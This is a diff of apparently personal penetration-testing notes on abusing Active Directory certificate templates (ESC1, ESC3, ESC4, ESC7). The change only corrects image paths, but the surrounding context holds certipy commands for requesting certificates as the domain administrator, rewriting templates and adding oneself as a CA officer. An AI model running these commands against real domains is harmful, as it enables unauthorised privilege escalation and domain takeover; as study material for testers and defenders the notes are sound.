@@ -17,7 +17,7 @@ certipy find -u username@domain.com -p 'pass' -vulnerable -dc-ip DCIP -bloodhoun
 
 Request a certificate from a vulnerable template
 
-![Alt text](image-2.png)
+![Alt text](/Images/image-2.png)
 
 ```bash
 certipy req -u username@domain.com -p 'pass' -target <CAs DNS Name> -template <Template Name> -ca <Certificate Authorities> -upn administrator@domain.com
@@ -28,7 +28,7 @@ certipy auth -pfx administrator.pfx -dc-ip $ip
 
 Template can be used for any purpose
 
-![Alt text](image-3.png)
+![Alt text](/Images/image-3.png)
 
 ```bash
 # Query cert
@@ -43,7 +43,7 @@ certipy auth -pfx administrator.pfx -dc-ip $ip
 
 Use an enrollment agent to request a certificate
 
-![Alt text](image-4.png)
+![Alt text](/Images/image-4.png)
 
 ```bash
 certipy req -u username@domain.com -p 'pass' -target <CAs DNS Name> -template <Template Name  ESC3-CRA> -ca <Certificate Authorities>
@@ -55,7 +55,7 @@ certipy auth -pfx administrator.pfx -username administrator -domain domain.com -
 
 Write privilege over a certificate template
 
-![Alt text](image-5.png)
+![Alt text](/Images/image-5.png)
 
 ```bash
 #Take the ESC4 template and change it to be vulnerable to ESC1 technique by using the genericWrite privilege we got. (we didn’t set the target here as we target the ldap)
@@ -91,13 +91,13 @@ ESC7 is when a user has the Manage CA or Manage Certificates access right on a C
 
 If we don’t have the Manage Certificates access right, we can just add ourselves as a new “officer”
 
-![Alt text](image-7.png)
+![Alt text](/Images/image-7.png)
 
 ```bash
 certipy ca -u 'username@domain.com' -p 'password' -ca 'CA Name' -add-officer 'username'
 ```
 
-![Alt text](image-8.png)
+![Alt text](/Images/image-8.png)
 
 List and enable SubCA or another vulnerable template
 
